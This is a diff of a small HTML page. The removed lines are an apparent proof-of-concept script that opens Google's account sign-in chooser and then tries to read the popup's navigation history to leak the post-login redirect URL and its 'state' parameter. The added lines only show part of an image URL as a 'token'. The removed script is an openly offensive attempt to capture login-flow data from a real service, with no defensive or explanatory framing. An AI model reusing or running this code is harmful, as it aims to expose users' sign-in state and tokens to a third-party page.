@@ -1,33 +1,13 @@
-<!DOCTYPE html>
-<html>
-  <head> </head>
-  <body>
-    <div id="start"></div>
+<img id="myImage" src="https://lh3.google.com/u/0/d/1snA1SLGWmWh5GhDtIulL3Y5BY75CYfOyFiy__dbHgIA=w5000-h5000-p-k-nu" />
 
-    <script>
-      function run() {
-        var win = open(
-          `https://accounts.google.com/AccountChooser/signinchooser?continue=https://lh3.google.com/u/0/d/1-TTCS6fS6kvFUkoJmX4Udr-czQ79lSUVXiWsiAED_bs=w200-h150-p-k-nu&flowEntry=AccountChooser&flowName=GlifWebSignIn&hl=id&ltmpl=youtube&service=youtube&authuser=0`
-        );
+<p>Token: <span id="tokenDisplay">Loading...</span></p>
 
-        setTimeout(() => {
-          try {
-            // Coba ambil URL terakhir dari window navigation
-            const leak = new URL(win.navigation.entries()[0].url);
-            console.log("Leaked URL:", leak.href);
+<script>
+  window.onload = function () {
+    let img = document.getElementById("myImage");
+    let url = new URL(img.src);
 
-            const redirectURL = `https://lh3.googleusercontent.com/fife/${leak.searchParams.get("state")}`;
-            document.body.innerHTML += `<p>Redirected to: <a href="${redirectURL}">${redirectURL}</a></p>`;
-          } catch (e) {
-            console.error("Error:", e);
-            document.body.innerHTML += `<p>Error: ${e.message}</p>`;
-          }
-        }, 3000);
-      }
-
-      document.getElementById("start").innerHTML = `
-        <button onclick="run()">Login & Redirect</button>
-      `;
-    </script>
-  </body>
-</html>
+    let token = url.pathname.split('/').pop(); // Ambil token dari URL
+    document.getElementById("tokenDisplay").textContent = token; // Tampilkan di halaman
+  };
+</script>
